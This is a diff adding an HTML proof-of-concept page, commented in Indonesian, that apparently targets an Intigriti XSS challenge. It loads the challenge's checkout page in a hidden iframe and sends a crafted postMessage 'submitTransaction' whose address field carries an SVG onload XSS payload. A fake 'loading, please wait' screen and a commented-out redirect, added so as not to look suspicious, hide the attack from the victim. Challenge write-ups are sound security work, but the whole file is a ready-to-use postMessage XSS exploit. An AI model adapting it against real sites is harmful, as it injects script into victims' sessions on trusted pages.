@@ -1,0 +1,50 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>XSS via postMessage Exploit PoC</title>
+</head>
+<body>
+    <h1>Memuat Konten...</h1>
+    <p>Silakan tunggu.</p>
+
+    <!-- 1. Sematkan halaman yang rentan dalam iframe -->
+    <iframe id="victim-iframe" src="https://challenge-0126.intigriti.io/checkout.html" style="display:none;"></iframe>
+
+    <script>
+        function launchAttack() {
+            console.log("Iframe dimuat. Menyiapkan payload XSS...");
+
+            const iframeWindow = document.getElementById('victim-iframe').contentWindow;
+
+            // ===============================================================
+            // PAYLOAD XSS DISISIPKAN DI SINI
+            // Payload ini akan dikirim ke server melalui postMessage dan API call
+            const xssPayload = '<svg/onload=alert(document.domain)>'; 
+            // ===============================================================
+
+            // 2. Siapkan payload transaksi, sekarang berisi string XSS
+            const maliciousTransactionPayload = {
+                toAddress: xssPayload, 
+                currency: "BTC", 
+                amount: 1
+            };
+
+            // 3. Buat objek pesan sesuai format yang diharapkan listener
+            const message = {
+                type: 'submitTransaction',
+                transaction: maliciousTransactionPayload
+            };
+            
+            // 4. "Lemparkan" pesan berisi payload XSS ke iframe
+            iframeWindow.postMessage(message, 'https://challenge-0126.intigriti.io');
+            
+            console.log("Pesan berisi payload XSS telah dikirim!");
+            // Redirect ke halaman lain agar tidak mencurigakan
+            // window.location.href = "https://google.com";
+        }
+
+        // Tunggu hingga iframe selesai dimuat sebelum mengirim pesan
+        document.getElementById('victim-iframe').onload = launchAttack;
+    </script>
+</body>
+</html>
